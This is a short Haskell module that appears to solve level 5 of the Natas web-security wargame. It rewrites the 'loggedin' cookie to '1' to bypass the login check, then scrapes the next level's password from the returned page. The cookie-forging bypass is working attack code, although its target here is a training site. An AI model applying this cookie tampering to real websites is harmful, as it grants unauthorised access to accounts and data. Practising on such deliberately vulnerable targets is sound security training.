module Natas.Natas5 where

import           Control.Lens
import qualified Data.ByteString.Lazy.Char8   as C
import           Data.Maybe                   (catMaybes, listToMaybe)
import qualified Data.Text                    as T
import           Data.Text.Encoding           (decodeUtf8)
import           Network.HTTP.Client.Internal (createCookieJar)
import           Network.Wreq
import           Text.HTML.TagSoup

import           Natas.Natas

solution :: Solution
solution = do
  req <- accessLevel 5
  let ckis = req ^.. responseCookie "loggedin"
      ckiopt = cookies .~ pure (createCookieJar (ckis <&> cookieValue .~ "1"))
  ckireq <- accessLevel' 5 (parentUri 5) ckiopt
  let body = (decodeUtf8 . C.toStrict) $ ckireq ^. responseBody
      match =
        (filter ("natas6" `elem`) .
         fmap T.words . catMaybes . fmap maybeTagText . parseTags)
          body
  pure $ listToMaybe match >>= (listToMaybe . reverse)
